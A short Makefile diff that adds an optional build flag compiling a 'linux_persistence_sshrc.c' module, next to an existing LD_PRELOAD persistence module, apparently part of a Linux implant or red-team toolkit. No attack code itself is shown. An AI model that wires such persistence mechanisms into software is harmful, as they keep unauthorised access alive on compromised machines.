@@ -41,6 +41,10 @@ ifeq ($(OS),linux)
     	SOURCES += src/linux_persistence_ld_preload.c
         CFLAGS += -DLD_PRELOAD_MOD
     endif
+    ifeq ($(FEATURE_SSHRC_MOD),1)
+    	SOURCES += src/linux_persistence_sshrc.c
+        CFLAGS += -DSSHRC_MOD
+    endif
 endif
 
 # 确保 SOURCES 不为空
